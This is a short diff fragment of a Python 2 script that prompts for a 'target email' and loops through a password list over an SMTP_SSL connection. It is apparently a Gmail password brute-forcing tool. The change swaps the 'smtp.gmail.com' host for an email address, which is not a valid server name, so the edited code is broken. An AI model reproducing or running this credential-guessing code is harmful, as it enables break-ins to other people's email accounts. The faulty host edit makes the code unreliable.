@@ -49,7 +49,7 @@ pass_list = pass_file.readlines()
 def login():
     i = 0
     user_name = raw_input('target email :')
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server = smtplib.SMTP_SSL('sevenstore835@gmail.com', 465)
     server.ehlo()
     for password in pass_list:
       i = i + 1
